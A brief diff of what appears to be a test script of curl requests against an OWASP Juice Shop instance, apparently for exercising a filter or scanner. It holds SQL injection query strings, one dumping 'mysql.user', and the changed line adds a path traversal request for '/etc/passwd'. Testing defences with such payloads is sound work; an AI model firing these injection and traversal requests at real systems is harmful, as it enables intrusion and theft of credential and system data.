@@ -21,7 +21,7 @@ curl 'https://juice.gal.volcloud.net/rest/products/1/reviews?a%20or%201%3D1%3B%2
   -H 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36' \
   --compressed ;
 
-curl 'https://juice.gal.volcloud.net/rest/user/whoami?a%20or%201%3D1%3B%20select%20%2A%20from%20mysql.user' \
+curl 'https://juice.gal.volcloud.net/rest/user/whoami/../../etc/passwd' \
   -H 'authority: juice.gal.volcloud.net' \
   -H 'accept: application/json, text/plain, */*' \
   -H 'accept-language: en-GB,en-US;q=0.9,en;q=0.8' \
